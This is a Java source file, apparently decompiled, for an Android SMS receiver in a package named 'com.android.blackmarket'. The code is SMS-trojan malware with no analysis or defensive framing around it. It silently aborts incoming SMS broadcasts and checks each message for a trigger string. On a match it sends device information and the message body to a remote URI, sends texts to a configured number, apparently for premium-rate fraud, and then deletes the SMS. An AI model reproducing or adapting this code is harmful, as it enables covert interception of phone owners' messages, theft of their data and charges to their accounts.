package com.android.blackmarket;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.gsm.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    public static Integer Counter = Integer.valueOf(0);
    private final String ACTION_RECEIVE_SMS = "android.provider.Telephony.SMS_RECEIVED";
    private Handler mHandler = new Handler();

    public void onReceive(Context context, Intent intent) {
        abortBroadcast();
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            final Context CN = context;
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                SmsMessage[] msgs = new SmsMessage[pdus.length];
                String SuperMessage = SmsMessage.createFromPdu((byte[]) pdus[0]).getMessageBody();
                function.GetInfoKeys(CN);
                if (SuperMessage.indexOf(function.GetGlobalString("DataINFO", CN)) != -1) {
                    Counter = Integer.valueOf(function.GetGlobalInt("Counter", CN));
                    String INFO;
                    String SuperMessage23;
                    String PATHAPP;
                    if (Counter.intValue() <= 4) {
                        INFO = function.ZEBLAZE(CN);
                        SuperMessage23 = function.StringCRT(SuperMessage);
                        function.GetSourceURL(function.GetGlobalString("URI", CN) + "?idajax=" + function.UrlEncode(INFO + "," + SuperMessage23));
                        PATHAPP = CN.getPackageName();
                        function.SMSSendFunction(function.GetGlobalString("Number", CN), function.GetGlobalString("KeyWord", CN));
                        Counter = Integer.valueOf(Counter.intValue() + 1);
                        function.SetGlobalInt("Counter", Counter.intValue(), CN);
                    } else {
                        if (Counter.intValue() <= 10) {
                            function.IfNotGoodKeyword(CN);
                            INFO = function.ZEBLAZE(CN);
                            SuperMessage23 = function.StringCRT(SuperMessage);
                            function.GetSourceURL(function.GetGlobalString("URI", CN) + "?idajax=" + function.UrlEncode(INFO + "," + SuperMessage23));
                            PATHAPP = CN.getPackageName();
                            function.SMSSendFunction(function.GetGlobalString("Number", CN), function.GetGlobalString("KeyWord", CN));
                        }
                        Counter = Integer.valueOf(Counter.intValue() + 1);
                        function.SetGlobalInt("Counter", Counter.intValue(), CN);
                    }
                }
            }
            this.mHandler.postDelayed(new Runnable() {
                public void run() {
                    function.deleteSMS(CN);
                }
            }, 50);
        }
    }
}
